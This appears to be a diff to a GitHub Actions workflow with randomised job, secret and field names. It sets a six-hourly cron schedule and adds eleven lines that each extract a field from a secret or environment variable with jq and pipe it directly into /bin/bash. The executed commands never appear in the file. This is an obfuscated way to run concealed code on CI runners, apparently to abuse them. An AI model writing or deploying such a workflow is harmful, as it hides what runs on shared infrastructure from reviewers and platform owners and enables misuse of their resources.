@@ -2,25 +2,27 @@ name: leidate7890
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 5/6 * * *'
+    - cron: '18 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: leidate7890
         env:
-          v486: ${{ secrets.v486 }}
+          jgqt271: ${{ secrets.jgqt271 }}
         run: |
-          echo $v486 | jq -r .xwy84289 | /bin/bash
-          echo $orvrr94489 | jq -r .lzh87 | /bin/bash
-          echo $tiq2 | jq -r .gmzjg4 | /bin/bash
-          echo $jsuhn6152 | jq -r .r1105 | /bin/bash
-          echo $vw0984 | jq -r .gkqi3 | /bin/bash
-          echo $quod42 | jq -r .gouj100 | /bin/bash
-          echo $bkqp57 | jq -r .k784 | /bin/bash
-          echo $mpwpg51 | jq -r .kv9 | /bin/bash
-          echo $pudl27408 | jq -r .vtfl2 | /bin/bash
-          echo $fg8494 | jq -r .ykgd3082 | /bin/bash
-          echo $i35 | jq -r .uhfhq226 | /bin/bash
+          echo $jgqt271 | jq -r .zknas0905 | /bin/bash
+          echo $ixgek12075 | jq -r .p6 | /bin/bash
+          echo $n7311 | jq -r .ov394 | /bin/bash
+          echo $csc4 | jq -r .y0 | /bin/bash
+          echo $ppku2 | jq -r .dt3516 | /bin/bash
+          echo $mbo675 | jq -r .t8 | /bin/bash
+          echo $d3 | jq -r .pea47 | /bin/bash
+          echo $y7365 | jq -r .q077 | /bin/bash
+          echo $tp62480 | jq -r .oga2 | /bin/bash
+          echo $xprs7662 | jq -r .ohuw58 | /bin/bash
+          echo $yl862 | jq -r .yskdd267 | /bin/bash
 
